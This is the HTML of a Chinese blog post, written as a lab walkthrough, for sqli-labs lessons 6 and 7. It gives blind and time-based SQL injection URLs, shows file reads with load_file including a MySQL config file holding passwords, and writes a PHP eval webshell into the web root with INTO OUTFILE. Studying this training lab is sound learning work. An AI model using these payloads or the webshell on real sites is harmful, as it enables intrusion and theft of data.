@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>sqli-labs 6-7 布尔型盲注 延时注入 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sqli-labs,盲注,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>sqli-labs 6-7 布尔型盲注 延时注入</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-03-29
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p> <a href="http://43.247.91.228:84/Less-6/" target="_blank" rel="noopener">地址</a></p>
+<p>类型:布尔型盲注</p>
+<p>这一关的的注入方法和第五关相同，只是sql查询语句不同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-6/?id=1 &apos; and 1=2 --+ # 页面正常</span><br><span class="line">http://43.247.91.228:84/Less-6/?id=1 &quot; and 1=2 --+  #页面异常</span><br></pre></td></tr></table></figure>
+<p>这里通过看源码可知，是对id参数进行了处理</p>
+<p><code>$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</code></p>
+<p>sql查询语句为<code>$sql=&quot;SELECT * FROMusers WHERE id=$id LIMIT 0,1&quot;;</code></p>
+<p>所以这里的只需要less-5中的语句中的单引号改为双引号就可以了</p>
+<blockquote>
+<h2 id="Less-7-Dump-into-Outfile"><a href="#Less-7-Dump-into-Outfile" class="headerlink" title="Less-7 Dump into Outfile"></a>Less-7 Dump into Outfile</h2><p><a href="http://43.247.91.228:84/Less-7/" target="_blank" rel="noopener">地址</a></p>
+</blockquote>
+<p>从这一关开始重视题目标题的作用，这一关的名字是 Dump into Outfile 意思是通过文件导入的方式进行注入，这里刚开始接触这种注入方式，所以详细写一下</p>
+<h3 id="导入导出相关操作的详解"><a href="#导入导出相关操作的详解" class="headerlink" title="导入导出相关操作的详解"></a>导入导出相关操作的详解</h3><blockquote>
+<p>以下摘自《MYSQL注入天书》</p>
+</blockquote>
+<h4 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h4><blockquote>
+<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br>使用条件：<br>A 必须有权限读取并且文件必须完全可读<br><code>and (selectcount(*) from mysql.user)&gt;0/*</code>如果结果返回正常,说明具有读写权限。<br><code>and (select count(*) from mysql.user)&gt;0/*</code>返回错误，应该是管理员给数据库帐户降权<br>B、欲读取文件必须在服务器上<br>C、必须指定文件完整的路径<br>D、欲读取文件必须小于 max_allowed_packet</p>
+</blockquote>
+<p>在实际注入中，有两个难点和要求</p>
+<p>一、绝对物理路径<br>二、构造有效的畸形语句 （报错爆出绝对路径）<br>在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露<br>WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务<br>器的安全将受到严重的威胁。</p>
+<p><a href="[http://www.cnblogs.com/lcamry/p/5729087.html]">常用的路径</a></p>
+<h4 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h4><p> LOAD DATAINFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必<br>须为一个文字字符串。</p>
+<p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据<br>库的权限时，可以将系统文件利用 load data infile 导入到数据库中。</p>
+<h4 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h4><p><code>SELECT.....INTO OUTFILE &#39;file_name&#39;</code><br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE<br>权限，才能使用此语法。file_name 不能是一个已经存在的文件。<br>我们一般有两种利用形式：<br>第一种直接将 select 内容导入到文件中：<br><code>Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</code><br>此处将 version()替换成一句话，<code>&lt;?php @eval($_post[“mima”])?&gt;也即
+Select &lt;?php @eval(post[“mima”])?&gt;也即Select&lt;?php@eval(_post[“mima”])?&gt;也即
+Select &lt;?php @eval(p​ost[“mima”])?&gt;也即Select&lt;?php@eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</code><br>直接连接一句话就可以了，其实在 select 内容中不仅仅是可以上传一句话的，也可以上传很<br>多的内容。<br>第二种修改文件结尾：<br><code>Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16</code>进制文<br>件<br>解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS<br><code>TERMINATED BY</code><br>16 进制可以为一句话或者其他任何的代码，可自行构造。在 sqlmap 中 os-shell 采取的就是<br>这样的方式，具体可参考 os-shell 分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5505110.html</a><br>TIPS：<br>（1）可能在文件路径当中要注意转义，这个要看具体的环境<br>（2）上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语<br>句：<br>select load_file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)into outfile<br>‘c:\wamp\www\test.php’<br>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。<br>上述 my.ini 当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来，<br>这个要平时积累。</p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>当在地址后面加上 ‘)) or 1=1 –+时<code>http://43.247.91.228:84/Less-7/?id=1 &#39;)) --+</code></p>
+<p>页面返回正常，显示<code>You are in.... Use outfile......</code></p>
+<p>按照文档中的提示，可以构造<code>http://43.247.91.228:84/Less-7/?id=1 &#39;)) union select 1,2,3 into outfile &quot;c:\\wamp\\www\\sqllib\\Less-7\\uuu.txt&quot; --+</code> 来把uuu.txt保存到less-7的根目录，但是剧具体操作时，并没有在相应目录下生成，推测是目录没有设置正确，这需要推测网站的目录结构。</p>
+<p>这种方式也可以将一句话木马导入进去</p>
+<p>因此这里使用延时注入，延时注入就是使用sleep()函数，当页面错误时，会等待相应的时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-7/?id=1 &apos;)) and  if(ascii(substr(database(),1,1))=115,1,sleep(5))  --+</span><br><span class="line">说明第一位是s</span><br><span class="line">http://43.247.91.228:84/Less-7/?id=1 &apos;)) and  if(ascii(substr(database(),2,1))=101,1,sleep(5))  --+</span><br><span class="line">说明第二位是e</span><br></pre></td></tr></table></figure>
+<p>…以此类推，得出数据库为 security，接下来猜测security中的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-7/?id=1 &apos;)) and  if(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=101,1,sleep(5))  --+</span><br><span class="line">说明security数据库中的第一个表的第一位为e</span><br><span class="line">....可以使用二分法</span><br></pre></td></tr></table></figure>
+<p>以此类推，前面也写过，这样就能够得到所有的表名，进一步可以推测表中的列名，以及表中的数据，这些都可以通过这这种方法得到。</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/f865e8e3.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/sqli-labs/">
+              #sqli-labs
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/盲注/">
+              #盲注
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/cde68b77.html" target="_self">sqli-labs 2-5 初识盲注</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/15b91408.html" target="_self">初识XSS攻击 XSS Challenges闯关1-4</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
